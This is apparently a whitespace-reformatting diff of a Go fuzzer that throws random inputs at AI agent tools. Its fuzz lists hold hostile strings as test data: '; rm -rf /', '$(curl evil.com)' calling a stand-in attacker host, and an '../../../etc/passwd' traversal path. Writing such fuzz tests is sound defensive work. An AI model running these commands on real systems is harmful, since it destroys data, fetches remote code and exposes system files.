@@ -25,11 +25,11 @@ type Input struct {
 
 // Result holds the outcome of a fuzzer run.
 type Result struct {
-	Input     Input  `json:"input"`
-	Output    string `json:"output"`
-	Error     string `json:"error,omitempty"`
-	Panic     string `json:"panic,omitempty"`
-	Duration  time.Duration `json:"duration"`
+	Input    Input         `json:"input"`
+	Output   string        `json:"output"`
+	Error    string        `json:"error,omitempty"`
+	Panic    string        `json:"panic,omitempty"`
+	Duration time.Duration `json:"duration"`
 }
 
 // Tool is the interface a tool must satisfy to be fuzzable.
@@ -40,8 +40,8 @@ type Tool interface {
 
 // Fuzzer generates and tests random inputs for tools.
 type Fuzzer struct {
-	mu     sync.Mutex
-	rng    *rand.Rand
+	mu      sync.Mutex
+	rng     *rand.Rand
 	results []Result
 }
 
@@ -69,7 +69,9 @@ func (f *Fuzzer) FuzzTool(ctx context.Context, tool Tool, n int) []Result {
 			}()
 			output, err := tool.Execute(ctx, input.Args)
 			result.Output = output
-			if err != nil { result.Error = err.Error() }
+			if err != nil {
+				result.Error = err.Error()
+			}
 		}()
 
 		result.Duration = time.Since(start)
@@ -115,12 +117,12 @@ func (f *Fuzzer) generateArgs(toolName string) json.RawMessage {
 
 func (f *Fuzzer) fuzzBash() json.RawMessage {
 	cmds := []string{
-		"", // empty
-		"; rm -rf /", // injection attempt
-		"$(curl evil.com)", // command substitution
+		"",                          // empty
+		"; rm -rf /",                // injection attempt
+		"$(curl evil.com)",          // command substitution
 		"echo " + fuzzString(10000), // very long
-		"\x00\x01\x02", // binary
-		"true", // normal
+		"\x00\x01\x02",              // binary
+		"true",                      // normal
 	}
 	cmd := cmds[f.rng.Intn(len(cmds))]
 	data, _ := json.Marshal(map[string]any{"command": cmd})
@@ -129,13 +131,13 @@ func (f *Fuzzer) fuzzBash() json.RawMessage {
 
 func (f *Fuzzer) fuzzFilePath() json.RawMessage {
 	paths := []string{
-		"", // empty
-		"/", // root
+		"",                    // empty
+		"/",                   // root
 		"../../../etc/passwd", // traversal
-		"/dev/null", // special file
-		fuzzString(5000), // very long
-		"\x00broken", // NUL byte
-		"normal.txt", // normal
+		"/dev/null",           // special file
+		fuzzString(5000),      // very long
+		"\x00broken",          // NUL byte
+		"normal.txt",          // normal
 	}
 	path := paths[f.rng.Intn(len(paths))]
 	content := fuzzString(1000)
@@ -160,7 +162,9 @@ func (f *Fuzzer) fuzzGeneric() json.RawMessage {
 		key := fuzzString(10)
 		obj[key] = fuzzValue()
 	}
-	if len(obj) == 0 { obj["empty"] = true }
+	if len(obj) == 0 {
+		obj["empty"] = true
+	}
 	data, _ := json.Marshal(obj)
 	return data
 }
@@ -170,19 +174,27 @@ func fuzzString(maxLen int) string {
 	var sb strings.Builder
 	for i := 0; i < n; i++ {
 		r := rune(rand.Intn(0x10FFFF))
-		if utf8.ValidRune(r) { sb.WriteRune(r) }
+		if utf8.ValidRune(r) {
+			sb.WriteRune(r)
+		}
 	}
 	return sb.String()
 }
 
 func fuzzValue() any {
 	switch rand.Intn(6) {
-	case 0: return nil
-	case 1: return ""
-	case 2: return fuzzString(100)
-	case 3: return rand.Intn(100000)
-	case 4: return rand.Float64()
-	default: return []any{1, "two", 3.0}
+	case 0:
+		return nil
+	case 1:
+		return ""
+	case 2:
+		return fuzzString(100)
+	case 3:
+		return rand.Intn(100000)
+	case 4:
+		return rand.Float64()
+	default:
+		return []any{1, "two", 3.0}
 	}
 }
 
@@ -203,8 +215,12 @@ func (f *Fuzzer) Summary() string {
 	var errors, panics, total int
 	for _, r := range f.results {
 		total++
-		if r.Error != "" { errors++ }
-		if r.Panic != "" { panics++ }
+		if r.Error != "" {
+			errors++
+		}
+		if r.Panic != "" {
+			panics++
+		}
 	}
 
 	return fmt.Sprintf("Fuzzer: %d runs, %d errors, %d panics", total, errors, panics)
@@ -216,7 +232,9 @@ func (f *Fuzzer) FindPanics() []Result {
 	defer f.mu.Unlock()
 	var out []Result
 	for _, r := range f.results {
-		if r.Panic != "" { out = append(out, r) }
+		if r.Panic != "" {
+			out = append(out, r)
+		}
 	}
 	return out
 }
@@ -227,7 +245,9 @@ func (f *Fuzzer) FindErrors() []Result {
 	defer f.mu.Unlock()
 	var out []Result
 	for _, r := range f.results {
-		if r.Error != "" { out = append(out, r) }
+		if r.Error != "" {
+			out = append(out, r)
+		}
 	}
 	return out
 }
